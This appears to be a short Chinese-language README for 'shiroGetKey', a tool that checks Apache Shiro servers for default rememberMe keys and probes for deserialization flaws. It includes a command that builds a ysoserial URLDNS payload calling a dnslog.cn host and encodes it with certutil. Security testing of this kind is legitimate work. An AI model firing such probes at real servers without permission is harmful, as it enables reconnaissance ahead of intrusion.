# shiroGetKey
检测默认key，探测漏洞

# 用途

1. 利用空SimplePrincipalCollection检测正常回显rememberMe=deleteMe
2. 利用dnslog进行探测特殊情况(反代)无回显漏洞是否存在

# payload生成

dnslog探测用ysoserial生成  
如下：
``` cmd
java -jar ysoserial-master-d367e379d9-1.jar URLDNS http://wxovk8.dnslog.cn >1.txt &certutil -encode 1.txt 2.txt&type 2.txt
```

